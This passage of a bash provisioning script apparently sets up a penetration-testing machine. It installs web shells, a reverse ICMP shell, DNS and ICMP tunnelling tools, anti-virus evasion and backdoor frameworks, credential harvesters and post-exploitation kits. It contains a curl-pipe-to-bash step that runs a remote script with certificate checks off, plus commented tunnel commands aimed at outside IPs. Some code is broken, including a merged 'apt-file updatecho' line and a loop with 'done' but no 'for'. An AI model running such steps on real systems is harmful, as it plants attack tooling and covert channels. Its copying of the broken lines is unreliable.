pushd /opt/b374k-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Link to others
ln -sf /usr/share/cmdsql-git /usr/share/webshells/aspx/cmdsql


##### Install JSP file browser
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}JSP file browser${RESET} ~ (JSP) web shell"
apt -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
mkdir -p /usr/share/jsp-filebrowser/
timeout 300 curl  -k -L -f "http://www.vonloesch.de/files/browser.zip" > /tmp/jsp.zip || echo -e ' '${RED}'[!]'${RESET}" Issue downloading jsp.zip" 1>&2    #***!!! hardcoded path!
unzip -q -o -d /usr/share/jsp-filebrowser/ /tmp/jsp.zip
#--- Link to others
apt -y -qq install webshells || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
ln -sf /usr/share/jsp-filebrowser /usr/share/webshells/jsp/jsp-filebrowser
#--- Remove old temp files
rm -f /tmp/jsp.zip


##### Install htshells
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}htShells${RESET} ~ (htdocs/apache) web shells"
apt -y -qq install htshells || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Link to others
apt -y -qq install webshells || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
ln -sf /usr/share/htshells /usr/share/webshells/htshells


##### Install python-pty-shells
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}python-pty-shells${RESET} ~ PTY shells"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/infodox/python-pty-shells.git /opt/python-pty-shells-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/python-pty-shells-git/ >/dev/null
git pull -q
popd >/dev/null


##### Install bridge-utils
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}bridge-utils${RESET} ~ bridge network interfaces"
apt -y -qq install bridge-utils || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2



##### Install ReconDomain
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ReconDomain${RESET} ~ Domian Setup script for Regon-ng"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/jhaddix/domain.git /opt/recon-domain-git || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/recon-domain-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/recon-domain-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/recon-domain-git/ && bash enumall.sh "\$@"
EOF
chmod +x "${file}"



##### Install Dorks
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}dorks${RESET} ~ google hack database automation tool"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/USSCltd/dorks.git /opt/dorks-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/dorks-git/ >/dev/null
git pull -q
popd >/dev/null

##### Install proxychains-ng
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}proxychains-ng${RESET} ~ proxifier"
apt -y -qq install git gcc || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/rofl0r/proxychains-ng.git /opt/proxychains-ng-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/proxychains-ng-git/ >/dev/null
git pull -q
make -s clean
./configure --prefix=/usr --sysconfdir=/etc >/dev/null
make -s 2>/dev/null && make -s install   # bad, but it gives errors which might be confusing (still builds)
popd >/dev/null
#--- Add to path (with a 'better' name)
ln -sf /usr/bin/proxychains4 /usr/local/bin/proxychains-ng



##### Install sshuttle
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}sshuttle${RESET} ~ VPN over SSH"
apt -y -qq install sshuttle || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Example
#sshuttle --dns --remote root@123.9.9.9 0/0 -vv


##### Install pfi
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}pfi${RESET} ~ Port Forwarding Interceptor"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/s7ephen/pfi.git /opt/pfi-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install icmpsh
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}icmpsh${RESET} ~ reverse ICMP shell"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/inquisb/icmpsh.git /opt/icmpsh-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install dnsftp
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}dnsftp${RESET} ~ transfer files over DNS"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/breenmachine/dnsftp.git /opt/dnsftp-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install iodine
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}iodine${RESET} ~ DNS tunneling (IP over DNS)"
apt -y -qq install iodine || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Example
#iodined -f -P password1 10.0.0.1 dns.mydomain.com
#iodine -f -P password1 123.9.9.9 dns.mydomain.com; ssh -C -D 8081 root@10.0.0.1


##### Install dns2tcp
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}dns2tcp${RESET} ~ DNS tunneling (TCP over DNS)"
apt -y -qq install dns2tcp || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#file=/etc/dns2tcpd.conf; [ -e "${file}" ] && cp -n $file{,.bkup}; echo -e "listen = 0.0.0.0\nport = 53\nuser = nobody\nchroot = /tmp\ndomain = dnstunnel.mydomain.com\nkey = password1\nressources = ssh:127.0.0.1:22" > "${file}"; dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf
#file=/etc/dns2tcpc.conf; [ -e "${file}" ] && cp -n $file{,.bkup}; echo -e "domain = dnstunnel.mydomain.com\nkey = password1\nresources = ssh\nlocal_port = 8000\ndebug_level=1" > "${file}"; dns2tcpc -f /etc/dns2tcpc.conf 178.62.206.227; ssh -C -D 8081 -p 8000 root@127.0.0.1


##### Install ptunnel
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ptunnel${RESET} ~ ICMP tunneling"
apt -y -qq install ptunnel || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Example
#ptunnel -x password1
#ptunnel -x password1 -p 123.9.9.9 -lp 8000 -da 127.0.0.1 -dp 22; ssh -C -D 8081 -p 8000 root@127.0.0.1


##### Install stunnel
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}stunnel${RESET} ~ SSL wrapper"
apt -y -qq install stunnel || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Remove from start up
systemctl disable stunnel4


##### Install zerofree
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}zerofree${RESET} ~ CLI nulls free blocks on a HDD"
apt -y -qq install zerofree || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Example
#fdisk -l
#zerofree -v /dev/sda1   #for i in $(mount | grep sda | grep ext | cut -b 9); do  mount -o remount,ro /dev/sda${i} && zerofree -v /dev/sda${i} && mount -o remount,rw /dev/sda${i}; done


##### Install gcc & multilib
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}gcc${RESET} & ${GREEN}multilibc${RESET} ~ compiling libraries"
#*** I know its messy...
for FILE in cc gcc g++ gcc-multilib make automake libc6 libc6-dev libc6-amd64 libc6-dev-amd64 libc6-i386 libc6-dev-i386 libc6-i686 libc6-dev-i686 build-essential dpkg-dev; do
  apt -y -qq install "${FILE}" 2>/dev/null
done


##### Install MinGW ~ cross compiling suite
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}MinGW${RESET} ~ cross compiling suite"
#*** I know its messy...
for FILE in mingw-w64 binutils-mingw-w64 gcc-mingw-w64 cmake   mingw-w64-dev mingw-w64-tools   gcc-mingw-w64-i686 gcc-mingw-w64-x86-64   mingw32; do
  apt -y -qq install "${FILE}" 2>/dev/null
done


##### Install WINE
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}WINE${RESET} ~ run Windows programs on *nix"
apt -y -qq install wine winetricks || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Using x64?
if [[ "$(uname -m)" == 'x86_64' ]]; then
  echo -e " ${GREEN}[+]${RESET} Configuring ${GREEN}WINE (x64)${RESET}"
  dpkg --add-architecture i386
  apt -qq update
  apt -y -qq install wine-bin:i386 || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
  #apt -y -qq remove wine64
  apt -y -qq install wine32 || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
fi
#--- Mono
timeout 300 curl  -k -L -f "http://winezeug.googlecode.com/svn/trunk/install-addons.sh" | sed 's/^set -x$//' | bash -   # || echo -e ' '${RED}'[!]'${RESET}" Issue downloading install-addons.sh" 1>&2
apt -y -qq install mono-vbnc || echo -e ' '${RED}'[!] Issue with apt'${RESET}   #mono-complete || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Run WINE for the first time
[ -e /usr/share/windows-binaries/whoami.exe ] && wine /usr/share/windows-binaries/whoami.exe &>/dev/null
#--- Winetricks: Disable 'axel' support - BUG too many redirects.
file=/usr/bin/winetricks; #[ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/which axel /which axel_disabled /' "${file}"
#--- Setup default file association for .exe
file=~/.local/share/applications/mimeapps.list; [ -e "${file}" ] && cp -n $file{,.bkup}
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
echo -e 'application/x-ms-dos-executable=wine.desktop' >> "${file}"


##### Install MinGW (Windows) ~ cross compiling suite
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}MinGW (Windows)${RESET} ~ cross compiling suite"
apt -y -qq install wine curl unzip \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
timeout 300 curl  -k -L -f "http://sourceforge.net/projects/mingw/files/Installer/mingw-get/mingw-get-0.6.2-beta-20131004-1/mingw-get-0.6.2-mingw32-beta-20131004-1-bin.zip/download" > /tmp/mingw-get.zip \
  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading mingw-get.zip" 1>&2       #***!!! hardcoded path!
mkdir -p ~/.wine/drive_c/MinGW/bin/
unzip -q -o -d ~/.wine/drive_c/MinGW/ /tmp/mingw-get.zip
pushd ~/.wine/drive_c/MinGW/ >/dev/null
   #msys-base
  wine ./bin/mingw-get.exe install "${FILE}" 2>&1 | grep -v 'If something goes wrong, please rerun with\|for more detailed debugging output'
done
popd >/dev/null
#--- Add to windows path
grep -q '^"PATH"=.*C:\\\\MinGW\\\\bin' ~/.wine/system.reg \
  || sed -i '/^"PATH"=/ s_"$_;C:\\\\MinGW\\\\bin"_' ~/.wine/system.reg
#wine cmd /c "set path=\"%path%;C:\MinGW\bin\" && reg ADD \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" /v Path /t REG_EXPAND_SZ /d %path% /f"


##### Downloading AccessChk.exe
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Downloading ${GREEN}AccessChk.exe${RESET} ~ Windows environment tester"
apt -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
timeout 300 curl  -k -L -f "https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe" > /usr/share/windows-resources/accesschk_v5.02.exe || echo -e ' '${RED}'[!]'${RESET}" Issue downloading accesschk_v5.02.exe" 1>&2   #***!!! hardcoded path!
timeout 300 curl  -k -L -f "https://download.sysinternals.com/files/AccessChk.zip" > /usr/share/windows-resources/AccessChk.zip || echo -e ' '${RED}'[!]'${RESET}" Issue downloading AccessChk.zip" 1>&2                                               #***!!! hardcoded path!
unzip -q -o -d /usr/share/windows-binaries/ /usr/share/windows-resources/AccessChk.zip
rm -f /usr/share/windows-resources/{AccessChk.zip,Eula.txt}

##### Downloading PsExec.exe
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Downloading ${GREEN}PsExec.exe${RESET} ~ Pass The Hash 'phun'"
apt -y -qq install curl unzip unrar \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
echo -n '[1/2]'; timeout 300 curl  -k -L -f "https://download.sysinternals.com/files/PSTools.zip" > /tmp/pstools.zip \
  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading pstools.zip" 1>&2
unzip -q -o -d /usr/share/windows-resources/pstools/ /tmp/pstools.zip



##### Install veil framework
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}veil-evasion framework${RESET} ~ bypassing anti-virus"
apt -y -qq install veil-evasion \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
#bash /usr/share/veil-evasion/setup/setup.sh --silent
mkdir -p /var/lib/veil-evasion/go/bin/
touch /etc/veil/settings.py
sed -i 's/TERMINAL_CLEAR=".*"/TERMINAL_CLEAR="false"/' /etc/veil/settings.py


##### Install the backdoor factory
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Backdoor Factory${RESET} ~ bypassing anti-virus"
apt -y -qq install backdoor-factory || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install responder
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Responder${RESET} ~ rogue server"
apt -y -qq install responder \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2

##### Install FuzzDB
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}FuzzDB${RESET} ~ multiple types of (word)lists (and similar things)"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/fuzzdb-project/fuzzdb.git /usr/share/wordlists/fuzzdb || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /usr/share/wordlists/fuzzdb/ >/dev/null
git pull -q
popd >/dev/null


##### Install seclist
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing SecList ${GREEN}seclist${RESET} ~ multiple types of (word)lists (and similar things)"
apt -y -qq install seclists || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
[ -e /usr/share/seclists ] && ln -sf /usr/share/seclists /usr/share/wordlists/seclists



##### Update wordlists
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Updating ${GREEN}wordlists${RESET} ~ collection of wordlists"
apt -y -qq install wordlists curl \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
#--- Extract rockyou wordlist
[ -e /usr/share/wordlists/rockyou.txt.gz ] \
  && gzip -dc < /usr/share/wordlists/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt
#--- Add 10,000 Top/Worst/Common Passwords
mkdir -p /usr/share/wordlists/
(curl  -k -L -f "http://xato.net/files/10k most common.zip" > /tmp/10kcommon.zip 2>/dev/null \
  || curl  -k -L -f "http://download.g0tmi1k.com/wordlists/common-10k_most_common.zip" > /tmp/10kcommon.zip 2>/dev/null) \
  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 10kcommon.zip" 1>&2
unzip -q -o -d /usr/share/wordlists/ /tmp/10kcommon.zip 2>/dev/null   #***!!! hardcoded version! Need to manually check for updates
mv -f /usr/share/wordlists/10k{\ most\ ,_most_}common.txt
#--- Linking to more - folders
[ -e /usr/share/dirb/wordlists ] \
  && ln -sf /usr/share/dirb/wordlists /usr/share/wordlists/dirb
#--- Extract sqlmap wordlist
unzip -o -d /usr/share/sqlmap/txt/ /usr/share/sqlmap/txt/wordlist.zip
ln -sf /usr/share/sqlmap/txt/wordlist.txt /usr/share/wordlists/sqlmap.txt
#--- Not enough? Want more? Check below!
#apt search wordlist
#find / \( -iname '*wordlist*' -or -iname '*passwords*' \) #-exec ls -l {} \;

##### Install apt-file
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}apt-file${RESET} ~ which package includes a specific file"
apt -y -qq install apt-file || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
apt-file updatecho -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}apt-show-versions${RESET} ~ which package version in repo"
apt -y -qq install apt-show-versions || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2



##### Install apt-show-versions
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}apt-show-versions${RESET} ~ which package version in repo"
apt -y -qq install apt-show-versions || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install Exploit-DB
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}Installing Exploit-DB binaries${RESET} ~ pre-compiled exploits"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/offensive-security/exploit-database.git /opt/exploitdb-git/
pushd /opt/exploitdb-git/ >/dev/null
git pull -q
popd >/dev/null
file=/usr/local/bin/searchsploit-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/exploitdb-git/ &&  ./searchsploit "\$@"
EOF
chmod a+x "${file}"
##### Install Babel scripts
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}Babel scripts${RESET} ~ post exploitation scripts"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/attackdebris/babel-sf.git /opt/babel-sf-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/babel-sf-git/ >/dev/null
git pull -q
popd >/dev/null


##### Install pwntools
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}pwntools${RESET} ~ handy CTF tools"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/Gallopsled/pwntools.git /opt/pwntools-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/pwntools-git/ >/dev/null
git pull -q
popd >/dev/null


##### Install nullsecurity tool suite
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}nullsecurity tool suite${RESET} ~ collection of tools"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/nullsecuritynet/tools.git /opt/nullsecuritynet-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/nullsecuritynet-git/ >/dev/null
git pull -q
popd >/dev/null

##### Install dirsearch
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}dirsearch${RESET} ~ brute force directories and files in websites"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/maurosoria/dirsearch.git /opt/dirsearch-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
#--- Add to path
file=/usr/local/bin/dirsearch-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/dirsearch-git/ && python3 dirsearch.py "\$@"
EOF
chmod +x "${file}"


##### Install gdb-peda
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}gdb-peda${RESET} ~ GDB exploit development assistance"
apt -y -qq install git gdb || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/longld/peda.git /opt/gdb-peda-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/gdb-peda-git/ >/dev/null
git pull -q
popd >/dev/null
echo "source ~/peda/peda.py" >> ~/.gdbinit

##### Install ropeme
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}ropeme${RESET} ~ generate ROP gadgets and payload"
apt -y -qq install git binutils || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/packz/ropeme.git /opt/ropeme-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/ropeme-git/ >/dev/null
git reset --hard HEAD
git pull -q
sed -i 's/distorm/distorm3/g' ropeme/gadgets.py
popd >/dev/null
#--- Add to path
file=/usr/local/bin/ropeme-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/ropeme-git/ && python3 ropeme/ropshell.py "\$@"
EOF
chmod +x "${file}"


##### Install ropper
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}ropper${RESET} ~ generate ROP gadgets and payload"
apt -y -qq install git python-capstone || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/sashs/Ropper.git /opt/ropper-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/ropper-git/ >/dev/null
git pull -q
python setup.py install
popd >/dev/null


##### Install shellnoob
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}shellnoob${RESET} ~ shellcode writing toolkit"
apt -y -qq install shellnoob || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2



##### Install shellconv
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}shellconv${RESET} ~ shellcode disassembler"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/hasherezade/shellconv.git /opt/shellconv-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/shellconv-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/shellconv-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/shellconv-git/ && python3 shellconv.py "\$@"
EOF
chmod +x "${file}"


##### Install bless
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}bless${RESET} ~ GUI hex editor"
apt -y -qq install bless || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install dhex
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}dhex${RESET} ~ CLI hex compare"
apt -y -qq install dhex || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install firmware-mod-kit
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}firmware-mod-kit${RESET} ~ customize firmware"
apt -y -qq install firmware-mod-kit || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


if [[ "$(uname -m)" == "x86_64" ]]; then
  ##### Install lnav
  (( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}lnav${RESET} (x64) ~ CLI log veiwer"
# apt -y -qq install git ncurses-dev libsqlite3-dev libgpm-dev || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
# git clone -q https://github.com/tstack/lnav.git /usr/local/src/tstack-git/
# pushd /usr/local/src/tstack-git >/dev/null
# git pull -q
# make -s clean
# bash autogen.sh
# ./configure
# make -s && make -s install
# popd >/dev/null
  curl  -k -L -f "https://github.com/tstack/lnav/releases/download/v0.10.1/lnav-0.10.1-musl-64bit.zip" > /tmp/lnav.zip || echo -e ' '${RED}'[!]'${RESET}" Issue downloading lnav.zip" 1>&2   #***!!! hardcoded version! Need to manually check for updates
  unzip -q -o -d /tmp/ /tmp/lnav.zip
  #--- Add to path
  mv -f /tmp/lnav-*/lnav /usr/local/bin/
fi


##### Install sqlmap (GIT)
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}sqlmap${RESET} (GIT) ~ automatic SQL injection"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/sqlmap-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/sqlmap-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/sqlmap-git/ && python3 sqlmap.py "\$@"
EOF
chmod +x "${file}"


##### Install commix
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}commix${RESET} ~ automatic command injection"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/stasinopoulos/commix.git /opt/commix-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2
pushd /opt/commix-git/ >/dev/null
git pull -q
popd >/dev/null
#--- Add to path
file=/usr/local/bin/commix-git
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
cd /opt/commix-git/ && python3 commix.py "\$@"
EOF
chmod +x "${file}"


##### Install fimap
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}fimap${RESET} ~ automatic LFI/RFI tool"
apt -y -qq install fimap || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install smbmap
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}smbmap${RESET} ~ SMB enumeration tool"
apt -y -qq install smbmap || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2


##### Install smbspider
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}smbspider${RESET} ~ search network shares"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/T-S-A/smbspider.git /opt/smbspider-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install CrackMapExec
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}CrackMapExec${RESET} ~ Swiss army knife for Windows environments"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/byt3bl33d3r/CrackMapExec.git /opt/crackmapexec-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install credcrack
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}credcrack${RESET} ~ credential harvester via Samba"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
git clone -q https://github.com/gojhonny/CredCrack.git /opt/credcrack-git/ || echo -e ' '${RED}'[!] Issue when git cloning'${RESET} 1>&2


##### Install Empire
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})  Installing ${GREEN}Empire${RESET} ~ PowerShell post-exploitation"
apt -y -qq install git || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
